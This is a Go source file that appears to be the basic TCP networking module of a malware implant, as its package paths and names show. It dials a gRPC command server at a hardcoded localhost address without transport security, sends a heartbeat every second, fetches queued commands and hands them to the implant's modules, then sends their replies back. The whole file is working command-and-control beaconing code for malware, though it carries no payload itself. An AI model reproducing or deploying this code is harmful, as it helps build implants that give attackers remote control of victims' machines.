package basic_tcp_network

import (
	"context"
	"fmt"
	"log"
	"malware/common/messages"
	pb "malware/common/messages"
	"malware/common/types"
	"malware/implant/included_modules"
	"time"

	"google.golang.org/grpc"
)

type state struct {
	running bool
	grpc    *grpc.Server
}

type settings struct {
	state *state
	host  string
}

func (settings settings) doConnection(conn *grpc.ClientConn) {
	client := pb.NewMalwareClient(conn)
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	heartbeat := &pb.CheckCmdRequest_Heartbeat{Heartbeat: time.Now().Unix()}
	fmt.Println("Sending heartbeat")
	reply, err := client.CheckCommandQueue(ctx, &pb.CheckCmdRequest{Message: heartbeat})

	if err != nil {
		fmt.Println("Sending heartbeat help broken", err)
		return
	}

	fmt.Println(reply)
	for _, module := range included_modules.Modules {
		module.HandleMessage(reply, func(reply *messages.ImplantReply) {
			client.CheckCommandQueue(ctx, &messages.CheckCmdRequest{Message: &pb.CheckCmdRequest_Reply{Reply: reply}})
		})
	}

}

func (settings settings) listenServer() {
	conn, err := grpc.Dial(settings.host, grpc.WithInsecure())
	if err != nil {
		log.Fatalf("fail to dial: %v", err)
	}

	defer conn.Close()

	for settings.state.running {
		settings.doConnection(conn)

		time.Sleep(1 * time.Second)
	}
}

func (settings settings) HandleMessage(*messages.CheckCmdReply, func(*messages.ImplantReply)) {
	// Empty stub
}

func Create() types.Module {
	port := int16(2000)
	ip := "127.0.0.1"
	state := state{}
	host := fmt.Sprintf("%s:%d", ip, port)

	return settings{&state, host}
}

func (settings settings) Init() {
	settings.state.running = true

	settings.listenServer()
}

func (settings settings) Shutdown() {
	settings.state.running = false
}

func (settings) ID() string { return "Basic TCP Network" }
